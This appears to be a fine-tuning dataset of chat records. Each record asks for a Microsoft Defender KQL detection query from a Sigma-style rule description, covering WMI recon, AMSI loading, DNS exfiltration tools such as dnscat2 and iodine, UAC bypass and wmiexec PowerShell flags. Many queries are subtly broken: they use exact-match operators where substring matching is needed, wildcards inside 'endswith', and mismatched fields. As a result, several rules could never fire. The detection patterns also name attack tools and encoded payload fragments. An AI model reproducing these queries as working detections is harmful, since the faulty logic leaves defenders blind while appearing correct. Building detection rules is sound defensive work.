{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects known WMI recon method to look for unquoted service paths using wmic. Often used by pentester and attacker enumeration scripts Topic: proc_creation_win_wmic_recon_unquoted_service_search"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" service get \", \"name,displayname,pathname,startmode\")) and (ProcessVersionInfoOriginalFileName =~ \"wmic.exe\" or FolderPath endswith \"\\\\WMIC.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects loading of Amsi.dll by uncommon processes Topic: image_load_dll_amsi_uncommon_process"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\amsi.dll\" and (not((((InitiatingProcessFolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\\") and InitiatingProcessFolderPath =~ \"\\\\ngentask.exe\") or InitiatingProcessFolderPath =~ \"\" or (InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\explorer.exe\", \":\\\\Windows\\\\Sysmon64.exe\")) or (InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\System32\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\SysWOW64\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\WinSxS\\\\\") or isnull(InitiatingProcessFolderPath)))) and (not((InitiatingProcessFolderPath has_all (\"\\\\MsMpEng.exe\") and InitiatingProcessFolderPath contains \":\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects base64 encoded strings used in hidden malicious PowerShell command lines Topic: proc_creation_win_powershell_base64_hidden_flag"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA\", \"aXRzYWRtaW4gL3RyYW5zZmVy\", \"IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA\", \"JpdHNhZG1pbiAvdHJhbnNmZX\", \"YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg\", \"Yml0c2FkbWluIC90cmFuc2Zlc\", \"AGMAaAB1AG4AawBfAHMAaQB6AGUA\", \"JABjAGgAdQBuAGsAXwBzAGkAegBlA\", \"JGNodW5rX3Npem\", \"QAYwBoAHUAbgBrAF8AcwBpAHoAZQ\", \"RjaHVua19zaXpl\", \"Y2h1bmtfc2l6Z\", \"AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A\", \"kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg\", \"lPLkNvbXByZXNzaW9u\", \"SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA\", \"SU8uQ29tcHJlc3Npb2\", \"Ty5Db21wcmVzc2lvb\", \"AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ\", \"kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA\", \"lPLk1lbW9yeVN0cmVhb\", \"SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A\", \"SU8uTWVtb3J5U3RyZWFt\", \"Ty5NZW1vcnlTdHJlYW\", \"4ARwBlAHQAQwBoAHUAbgBrA\", \"5HZXRDaHVua\", \"AEcAZQB0AEMAaAB1AG4Aaw\", \"LgBHAGUAdABDAGgAdQBuAGsA\", \"LkdldENodW5r\", \"R2V0Q2h1bm\", \"AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A\", \"QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA\", \"RIUkVBRF9JTkZPNj\", \"SFJFQURfSU5GTzY0\", \"VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA\", \"VEhSRUFEX0lORk82N\", \"AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA\", \"cmVhdGVSZW1vdGVUaHJlYW\", \"MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA\", \"NyZWF0ZVJlbW90ZVRocmVhZ\", \"Q3JlYXRlUmVtb3RlVGhyZWFk\", \"QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA\", \"0AZQBtAG0AbwB2AGUA\", \"1lbW1vdm\", \"AGUAbQBtAG8AdgBlA\", \"bQBlAG0AbQBvAHYAZQ\", \"bWVtbW92Z\", \"ZW1tb3Zl\")) and ProcessCommandLine =~ \" hidden \" and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "detects the usage of path traversal in conhost.exe indicating possible command/argument confusion/hijacking Topic: proc_creation_win_conhost_path_traversal"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"conhost\" and ProcessCommandLine =~ \"/../../\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Office application called wmic to proxye execution through a LOLBIN process. This is often used to break suspicious parent-child chain (Office app spawns LOLBin). Topic: proc_creation_win_wmic_susp_execution_via_office_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\WINWORD.EXE\", \"\\\\EXCEL.EXE\", \"\\\\POWERPNT.exe\", \"\\\\MSPUB.exe\", \"\\\\VISIO.exe\", \"\\\\MSACCESS.EXE\", \"\\\\EQNEDT32.EXE\", \"\\\\ONENOTE.EXE\", \"\\\\wordpad.exe\", \"\\\\wordview.exe\")) and (ProcessCommandLine in~ (\"regsvr32\", \"rundll32\", \"msiexec\", \"mshta\", \"verclsid\", \"wscript\", \"cscript\")) and (FolderPath endswith \"\\\\wbem\\\\WMIC.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands\n Topic: proc_creation_win_webshell_tool_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"-tomcat-\", \"\\\\tomcat\")) or ((InitiatingProcessFileName in~ (\"\\\\java.exe\", \"\\\\javaw.exe\")) and (ProcessCommandLine in~ (\"CATALINA_HOME\", \"catalina.jar\"))) or (InitiatingProcessFileName in~ (\"\\\\caddy.exe\", \"\\\\httpd.exe\", \"\\\\nginx.exe\", \"\\\\php-cgi.exe\", \"\\\\w3wp.exe\", \"\\\\ws_tomcatservice.exe\"))) and (ProcessCommandLine in~ (\"perl --help\", \"perl -h\", \"python --help\", \"python -h\", \"python3 --help\", \"python3 -h\", \"wget --help\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry keys related to NetWire RAT Topic: registry_add_malware_netwire"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"RegistryKeyCreated\" and RegistryKey contains \"\\\\software\\\\NetWire\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects signs of the exploitation of LPE CVE-2021-41379 that include an msiexec process that creates an elevation_service.exe file Topic: file_event_win_cve_2021_41379_msi_lpe"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\elevation_service.exe\" and InitiatingProcessFolderPath =~ \"\\\\msiexec.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Topic: proc_creation_win_susp_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\tree.com\" or FolderPath endswith \"\\\\WMIC.exe\" or FolderPath endswith \"\\\\doskey.exe\" or FolderPath endswith \"\\\\sc.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"wmic.exe\", \"DOSKEY.EXE\", \"sc.exe\"))) and (InitiatingProcessCommandLine in~ (\" > %TEMP%\\\\\", \" > %TMP%\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The \"VSIISExeLauncher.exe\" binary part of the Visual Studio/VS Code can be used to execute arbitrary binaries Topic: proc_creation_win_lolbin_vsiisexelauncher"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -p \", \" -a \")) and (FolderPath endswith \"\\\\VSIISExeLauncher.exe\" or ProcessVersionInfoOriginalFileName =~ \"VSIISExeLauncher.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques Topic: proc_creation_win_tapinstall_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\tapinstall.exe\" and (not(((FolderPath contains \":\\\\Program Files\\\\Avast Software\\\\SecureLine VPN\\\\\" or FolderPath contains \":\\\\Program Files (x86)\\\\Avast Software\\\\SecureLine VPN\\\\\") or FolderPath contains \":\\\\Program Files\\\\OpenVPN Connect\\\\drivers\\\\tap\\\\\" or FolderPath contains \":\\\\Program Files (x86)\\\\Proton Technologies\\\\ProtonVPNTap\\\\installer\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects loading of essential DLLs used by PowerShell by non-PowerShell process.\nDetects behavior similar to meterpreters \"load powershell\" extension.\n Topic: image_load_dll_system_management_automation_susp_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (InitiatingProcessVersionInfoFileDescription =~ \"System.Management.Automation\" or InitiatingProcessVersionInfoOriginalFileName =~ \"System.Management.Automation.dll\" or (FolderPath endswith \"\\\\System.Management.Automation.dll\" or FolderPath endswith \"\\\\System.Management.Automation.ni.dll\")) and (not((((InitiatingProcessFolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\\") and InitiatingProcessFolderPath =~ \"\\\\mscorsvw.exe\") or (InitiatingProcessFolderPath in~ (\":\\\\Program Files\\\\PowerShell\\\\7\\\\pwsh.exe\", \":\\\\Windows\\\\System32\\\\dsac.exe\", \":\\\\WINDOWS\\\\System32\\\\RemoteFXvGPUDisablement.exe\", \":\\\\Windows\\\\System32\\\\runscripthelper.exe\", \":\\\\WINDOWS\\\\System32\\\\sdiagnhost.exe\", \":\\\\Windows\\\\System32\\\\ServerManager.exe\", \":\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.exe\", \":\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe\", \":\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \":\\\\Windows\\\\System32\\\\winrshost.exe\", \":\\\\Windows\\\\System32\\\\wsmprovhost.exe\", \":\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe\", \":\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \":\\\\Windows\\\\SysWOW64\\\\winrshost.exe\", \":\\\\Windows\\\\SysWOW64\\\\wsmprovhost.exe\"))))) and (not((isnull(InitiatingProcessFolderPath) or InitiatingProcessFolderPath contains \":\\\\ProgramData\\\\chocolatey\\\\choco.exe\" or InitiatingProcessFolderPath =~ \"\\\\Citrix\\\\ConfigSync\\\\ConfigSyncRun.exe\" or (InitiatingProcessFolderPath contains \":\\\\Windows\\\\Temp\\\\asgard2-agent\\\\\" and (InitiatingProcessFolderPath in~ (\"\\\\thor64.exe\", \"\\\\thor.exe\"))) or ((InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\Microsoft SQL Server Management Studio\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft SQL Server Management Studio\") and InitiatingProcessFolderPath =~ \"\\\\IDE\\\\Ssms.exe\") or ((InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\Microsoft SQL Server\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft SQL Server\\\\\") and InitiatingProcessFolderPath =~ \"\\\\Tools\\\\Binn\\\\SQLPS.exe\") or (InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft Visual Studio\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Xwizard tool from a non-default directory.\nWhen executed from a non-default directory, this utility can be abused in order to side load a custom version of \"xwizards.dll\".\n Topic: proc_creation_win_xwizard_execution_non_default_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\xwizard.exe\" or ProcessVersionInfoOriginalFileName =~ \"xwizard.exe\") and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enabling of the Windows Recall feature via registry manipulation. Windows Recall can be enabled by deleting the existing \"DisableAIDataAnalysis\" registry value.\nAdversaries may enable Windows Recall as part of post-exploitation discovery and collection activities.\nThis rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary.\n Topic: registry_delete_enable_windows_recall"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"DeleteValue\" and RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\WindowsAI\\\\DisableAIDataAnalysis\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of netsh to configure a port forwarding of port 3389 (RDP) rule Topic: proc_creation_win_netsh_port_forwarding_3389"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" i\", \" p\", \"=3389\", \" c\")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of commands via the run dialog box on Windows by checking values of the \"RunMRU\" registry key.\nThis technique was seen being abused by threat actors to deceive users into pasting and executing malicious commands, often disguised as CAPTCHA verification steps.\n Topic: registry_set_runmru_susp_command_execution"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RunMRU\" and (((RegistryValueData contains \"powershell\" or RegistryValueData contains \"pwsh\") and (RegistryValueData contains \" -e \" or RegistryValueData contains \" -ec \" or RegistryValueData contains \" -en \" or RegistryValueData contains \" -enc \" or RegistryValueData contains \" -enco\" or RegistryValueData contains \"ftp\" or RegistryValueData contains \"Hidden\" or RegistryValueData contains \"http\" or RegistryValueData contains \"iex\" or RegistryValueData contains \"Invoke-\")) or (RegistryValueData contains \"wmic\" and (RegistryValueData contains \"shadowcopy\" or RegistryValueData contains \"process call create\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privileges. This is often used after a privilege escalation attempt. Topic: proc_creation_win_whoami_priv_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /priv\", \" -priv\")) and (FolderPath endswith \"\\\\whoami.exe\" or ProcessVersionInfoOriginalFileName =~ \"whoami.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential malicious modification of run keys by winekey or team9 backdoor Topic: registry_event_runkey_winekey"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Backup Mgr\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious execution of the Regasm/Regsvcs utilities with an uncommon extension. Topic: proc_creation_win_regasm_regsvcs_uncommon_extension_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".dat\", \".gif\", \".jpeg\", \".jpg\", \".png\", \".txt\")) and ((FolderPath endswith \"\\\\Regsvcs.exe\" or FolderPath endswith \"\\\\Regasm.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"RegSvcs.exe\", \"RegAsm.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a shell program such as the Windows command prompt or PowerShell is launched with system privileges from a uncommon parent location. Topic: proc_creation_win_susp_elevated_system_shell_uncommon_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\cmd.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\", \"Cmd.Exe\"))) and ((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and InitiatingProcessSessionId =~ \"0x3e7\")) and (not(((InitiatingProcessFileName in~ (\":\\\\Program Files (x86)\\\\\", \":\\\\Program Files\\\\\", \":\\\\ProgramData\\\\\", \":\\\\Windows\\\\System32\\\\\", \":\\\\Windows\\\\SysWOW64\\\\\", \":\\\\Windows\\\\Temp\\\\\", \":\\\\Windows\\\\WinSxS\\\\\")) or InitiatingProcessFileName =~ \"\" or isnull(InitiatingProcessFileName)))) and (not(((InitiatingProcessFolderPath =~ \":\\\\WINDOWS\\\\Temp\\\\asgard2-agent\\\\\" and ProcessCommandLine =~ \":\\\\WINDOWS\\\\system32\\\\cmd.exe /c \\\"\") or (InitiatingProcessFileName =~ \":\\\\IBM\\\\SpectrumProtect\\\\webserver\\\\scripts\\\\\" and ProcessCommandLine =~ \":\\\\IBM\\\\SpectrumProtect\\\\webserver\\\\scripts\\\\\") or (InitiatingProcessFileName =~ \":\\\\ManageEngine\\\\ADManager Plus\\\\pgsql\\\\bin\\\\postgres.exe\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Windows binaries from within a WSL instance.\nThis could be used to masquerade parent-child relationships\n Topic: proc_creation_win_wsl_windows_binaries_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath matches regex \"[a-zA-Z]:\\\\\\\\\" and InitiatingProcessFolderPath =~ \"\\\\\\\\wsl.localhost\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Well-known DNS Exfiltration tools execution Topic: proc_creation_win_dns_exfiltration_tools_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\iodine.exe\" or FolderPath contains \"\\\\dnscat2\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enabling of the Windows Recall feature via registry manipulation. Windows Recall can be enabled by setting the value of \"DisableAIDataAnalysis\" to \"0\".\nAdversaries may enable Windows Recall as part of post-exploitation discovery and collection activities.\nThis rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary.\n Topic: registry_set_enable_windows_recall"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsAI\\\\DisableAIDataAnalysis\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the registry values related to outlook that indicates that a reminder was triggered for a Note or Task item. This could be a sign of exploitation of CVE-2023-23397. Further investigation is required to determine the success of an exploitation. Topic: registry_set_exploit_cve_2023_23397_outlook_reminder_trigger"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Office*\" and RegistryKey endswith \"\\\\Outlook*\") and (RegistryKey endswith \"\\\\Tasks*\" or RegistryKey endswith \"\\\\Notes*\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script thats located in a potentially suspicious location to run for a specific VM state Topic: proc_creation_win_vmware_toolbox_cmd_persistence_susp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" script \", \" set \")) and (FolderPath endswith \"\\\\VMwareToolBoxCmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"toolbox-cmd.exe\") and (ProcessCommandLine in~ (\":\\\\PerfLogs\\\\\", \":\\\\Temp\\\\\", \":\\\\Windows\\\\System32\\\\Tasks\\\\\", \":\\\\Windows\\\\Tasks\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\Temp\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects UAC bypass method using Windows event viewer Topic: registry_set_uac_bypass_eventvwr"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\mscfile\\\\shell\\\\open\\\\command\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n Topic: image_load_dll_rstrtmgr_suspicious_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\RstrtMgr.dll\" or InitiatingProcessVersionInfoOriginalFileName =~ \"RstrtMgr.dll\") and ((InitiatingProcessFolderPath contains \":\\\\Perflogs\\\\\" or InitiatingProcessFolderPath contains \":\\\\Users\\\\Public\\\\\" or InitiatingProcessFolderPath contains \"\\\\Temporary Internet\") or ((InitiatingProcessFolderPath contains \":\\\\Users\\\\\" and InitiatingProcessFolderPath contains \"\\\\Favorites\\\\\") or (InitiatingProcessFolderPath contains \":\\\\Users\\\\\" and InitiatingProcessFolderPath contains \"\\\\Favourites\\\\\") or (InitiatingProcessFolderPath contains \":\\\\Users\\\\\" and InitiatingProcessFolderPath contains \"\\\\Contacts\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation. Topic: proc_creation_win_lolbin_printbrm"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -f\", \".zip\")) and InitiatingProcessFolderPath =~ \"\\\\PrintBrm.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry persistence technique using the GlobalFlags and SilentProcessExit keys Topic: registry_set_persistence_globalflags"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion*\" and RegistryKey endswith \"\\\\Image File Execution Options*\" and RegistryKey contains \"\\\\GlobalFlag\") or ((RegistryKey endswith \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion*\" and RegistryKey endswith \"\\\\SilentProcessExit*\") and (RegistryKey contains \"\\\\ReportingMode\" or RegistryKey contains \"\\\\MonitorProcess\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Sysinternals PsSuspend which can be abused to suspend critical processes Topic: proc_creation_win_sysinternals_pssuspend_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"pssuspend.exe\" or (FolderPath endswith \"\\\\pssuspend.exe\" or FolderPath endswith \"\\\\pssuspend64.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential suspicious child processes of \"jamf\". Could be a sign of potential abuse of Jamf as a C2 server as seen by Typhon MythicAgent. Topic: proc_creation_macos_jamf_susp_child"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"/jamf\" and (InitiatingProcessFolderPath in~ (\"/bash\", \"/sh\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects SNAKE malware kernel driver file indicator Topic: file_event_win_malware_snake_encrypted_payload_ioc"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\Windows\\\\System32\\\\Com\\\\Comadmin.dat\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "A General detection for a new application in AppCompat. This indicates an application executing for the first time on an endpoint. Topic: registry_set_new_application_appcompat"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\AppCompatFlags\\\\Compatibility Assistant\\\\Store*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script Topic: proc_creation_win_hktl_wmiexec_default_powershell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"ConfigSecurityPolicy.EXE\", a binary part of Windows Defender used to manage settings in Windows Defender.\nUsers can configure different pilot collections for each of the co-management workloads.\nIt can be abused by attackers in order to upload or download files.\n Topic: proc_creation_win_configsecuritypolicy_download_file"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"ConfigSecurityPolicy.exe\" or FolderPath endswith \"\\\\ConfigSecurityPolicy.exe\" or ProcessVersionInfoOriginalFileName =~ \"ConfigSecurityPolicy.exe\") and (ProcessCommandLine in~ (\"ftp://\", \"http://\", \"https://\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs. Topic: proc_creation_win_odbcconf_register_dll_regsvr"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"REGSVR \", \".dll\")) and (FolderPath endswith \"\\\\odbcconf.exe\" or ProcessVersionInfoOriginalFileName =~ \"odbcconf.exe\")"}]}
